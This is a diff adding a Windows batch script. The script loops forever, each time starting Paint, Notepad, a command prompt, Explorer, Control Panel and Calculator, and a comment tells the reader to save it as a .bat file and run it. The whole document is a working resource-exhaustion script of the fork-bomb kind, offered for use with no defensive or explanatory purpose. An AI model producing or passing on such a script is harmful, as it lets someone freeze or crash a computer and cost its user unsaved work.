@@ -1,0 +1,12 @@
+@echo off
+:x
+start mspaint
+start notepad
+start cmd
+start explorer
+start control
+start calc
+goto x
+
+
+/* the above is the code for repeatedly opening the mentioned application. save it in .bat file and then open it to activate the process */
